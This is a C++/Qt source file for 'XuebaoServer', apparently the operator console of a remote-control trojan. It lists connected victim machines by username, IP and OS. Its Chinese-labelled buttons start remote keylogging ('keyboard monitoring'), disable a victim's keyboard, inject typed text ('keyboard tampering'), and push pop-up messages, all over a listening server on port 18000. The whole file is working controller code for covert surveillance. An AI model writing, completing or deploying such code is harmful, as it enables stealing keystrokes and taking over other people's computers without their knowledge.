#include "widget.h"
#include "ui_widget.h"


Widget::Widget(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Widget)
{
    ui->setupUi(this);

    // 先设置窗口的头相，资源图片在上面下载
    //this->setWindowIcon(QIcon());
    this->setWindowTitle("XuebaoServer");

    // 设置窗口大小
    const int w = 600, h = 500;

    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);
    this->setMaximumSize(QSize(w, h));
    this->setMinimumSize(QSize(w, h));

    // 设置按钮

    QPushButton *btKeyboardSpy = new QPushButton(QIcon(":/resources/keyboardspy.png"),"键盘监控", this);
    btKeyboardSpy->setIconSize(QSize(60,60));
    connect(btKeyboardSpy, SIGNAL(clicked(bool)), this, SLOT(keyboardClicked()));
    btKeyboardSpy->setGeometry(0,0,150,100);


    QPushButton *btKeyboardStop = new QPushButton(QIcon(":/resources/keyboardspy.png"),"键盘禁用", this);
    btKeyboardStop->setIconSize(QSize(60,60));
    connect(btKeyboardStop, SIGNAL(clicked(bool)), this, SLOT(keyboardStopClicked()));
    btKeyboardStop->setGeometry(150,0,150, 100);

    QPushButton *btKeyboardTakeOver = new QPushButton(QIcon(":/resources/keyboardspy.png"),"键盘篡改", this);
    btKeyboardTakeOver->setIconSize(QSize(60,60));
    connect(btKeyboardTakeOver, SIGNAL(clicked(bool)), this, SLOT(keyboardTakeOverClicked()));
    btKeyboardTakeOver->setGeometry(2*150,0,150, 100);





    // 设置QTableWiget来存放上线客户的信息
    mClientTable = new QTableWidget(this);
    mClientTable->setGeometry(0,100,450,400);
    mClientTable->setColumnCount(5);
    mClientTable->setHorizontalHeaderItem(0, new QTableWidgetItem("id"));
    mClientTable->setColumnWidth(0, 60);
    mClientTable->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
    mClientTable->setColumnWidth(1, 120);
    mClientTable->setHorizontalHeaderItem(2, new QTableWidgetItem("ip"));
    mClientTable->setColumnWidth(2, 120);
    mClientTable->setHorizontalHeaderItem(3, new QTableWidgetItem("端口"));
    mClientTable->setColumnWidth(3, 60);
    mClientTable->setHorizontalHeaderItem(4, new QTableWidgetItem("系统"));
    mClientTable->setColumnWidth(4, 90);
    // 设置选中一整行
    mClientTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    // 设置一次最多能选中一样
    mClientTable->setSelectionMode(QAbstractItemView::SingleSelection);
    // 设置不能修改
    mClientTable->setEditTriggers(QAbstractItemView::NoEditTriggers);

    // 增加三个槽函数在这个类
    // 增加客户到列表函数：addClientToTable(id, 电脑名, ip, 端口, 系统型号);
    // 从列表中删除客户：removeClientFromTable(id);
    // 获取当前客户ID： currentClientIdFromTable();

    // 当右击客户列表时弹出的操作菜单，比如重启客户的电脑
    mPopupMenu = new QMenu(this);
    QAction *actSendMessage = mPopupMenu->addAction("发送弹窗消息");
    connect(actSendMessage,SIGNAL(triggered(bool)), this, SLOT(sendMessageClicked()));
    QAction *actReboot = mPopupMenu->addAction("停止键盘篡改");
    connect(actReboot,SIGNAL(triggered(bool)), this,SLOT(keyboardTakeOverStopClicked()));


    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mClientTable->installEventFilter(this);

    // 服务器控制控件
    // 域名设置
    QLabel *lbDomain =  new QLabel("域名:", this);
    lbDomain->setGeometry(460,330,30,30);
    mEditDomain = new QLineEdit(this);
    mEditDomain->setText("127.0.0.1");
    mEditDomain->setMaxLength(80);
    mEditDomain->setGeometry(500,330,90,30);

    // 端口设置
    QLabel *lbPort=  new QLabel("端口:", this);
    lbPort->setGeometry(460,370,30,30);
    mEditPort = new QLineEdit(this);
    mEditPort->setText("18000");
    mEditPort->setValidator(new QIntValidator(1,65535));
    mEditPort->setGeometry(500,370,90,30);

    // 开始服务端
    mBtStartServer = new QPushButton("开启服务端",this);
    connect(mBtStartServer, SIGNAL(clicked(bool)), this, SLOT(startServer()));
    mBtStartServer->setGeometry(460,410, 120,40);


    // 初始化服务端
    mZeroServer = new ZeroServer(this);
    connect(mZeroServer, SIGNAL(clientLogin(int,QString,QString,int,QString)),
            this, SLOT(addClientToTable(int,QString,QString,int,QString)));
    connect(mZeroServer, SIGNAL(clientLogout(int)), this, SLOT(removeClientFromTable(int)));
}

Widget::~Widget()
{
    delete ui;
}



void Widget::keyboardClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        KeyboardSpy *ks = new KeyboardSpy();
        ZeroClient *client = mZeroServer->client(id);
        int port = ks->startKeyboardSpyServer(QString::number(id));

        // 开始监控
        client->sendKeyboardSpy(port);
    }
}


void Widget::keyboardStopClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        KeyboardStop *ks = new KeyboardStop();
        ZeroClient *client = mZeroServer->client(id);
        int port = ks->startKeyboardStopServer(QString::number(id));

        // 开始停用
        client->sendKeyboardStop(port);
    }

}

void Widget::keyboardTakeOverClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    if (id != -1) {
        bool isSend;
        QString text = QInputDialog::getText(this,
                                             QString("发送信息至%0号客户").arg(id),
                                             "请输入你要在客户端篡改的键盘信息",
                                             QLineEdit::Normal,
                                             "",
                                             &isSend);

        // 发送
        if (isSend) {
            ZeroClient *client = mZeroServer->client(id);
            client->sendKeyboardTakeOver(text);
        }
    }

}



void Widget::sendMessageClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    if (id != -1) {
        bool isSend;
        QString text = QInputDialog::getText(this,
                                             QString("发送信息至%0号客户").arg(id),
                                             "请输入你要在客户端弹出的窗口信息",
                                             QLineEdit::Normal,
                                             "",
                                             &isSend);

        // 发送
        if (isSend) {
            ZeroClient *client = mZeroServer->client(id);
            client->sendMessage(text);
        }
    }
}


void Widget::keyboardTakeOverStopClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    QString text = "stop";
    ZeroClient *client = mZeroServer->client(id);
    client->sendKeyboardTakeOver(text);

}



void Widget::addClientToTable(int id, QString name, QString ip, int port, QString systemInfo)
{
    int count = mClientTable->rowCount();
    mClientTable->setRowCount(count+1);

    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
    mClientTable->setItem(count, 0 , itemId);

    QTableWidgetItem *itemName = new QTableWidgetItem(name);
    mClientTable->setItem(count, 1 , itemName );

    QTableWidgetItem *itemIp = new QTableWidgetItem(ip);
    mClientTable->setItem(count, 2 , itemIp);

    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
    mClientTable->setItem(count, 3 , itemPort);

    QTableWidgetItem *itemSystemInfo = new QTableWidgetItem(systemInfo);
    mClientTable->setItem(count, 4 , itemSystemInfo);
}

void Widget::removeClientFromTable(int id)
{
    // 用ID判断该删除的行索引
    int count = mClientTable->rowCount();
    for (int i =0; i< count; ++i) {
        if (mClientTable->item(i, 0)->text().toInt() == id) {
            // 删除
            mClientTable->removeRow(i);
            break;
        }
    }
}

int Widget::currentClientIdFromTable()
{
    int index = mClientTable->currentRow();
    if (index == -1) {
        return -1;
    }
    return mClientTable->item(index, 0)->text().toInt();
}

bool Widget::eventFilter(QObject *watched, QEvent *event)
{
    // 右键弹出菜单
    if (watched==(QObject*)mClientTable) {
        if (event->type() == QEvent::ContextMenu) {
            mPopupMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}

void Widget::startServer()
{
    if (mZeroServer->server()->server()->isListening()) {
        mZeroServer->stop();
        mBtStartServer->setText("开启服务端");
        mEditPort->setReadOnly(false);
    } else {
        mZeroServer->start(mEditPort->text().toInt());
        if (mZeroServer->server()->server()->isListening()) {
            QMessageBox::information(this,"提示","开启服务端成功");
            mBtStartServer->setText("停止服务端");
            mEditPort->setReadOnly(true);
        } else {
            QMessageBox::warning(this, "提示", "开启服务端失败");
        }
    }
}
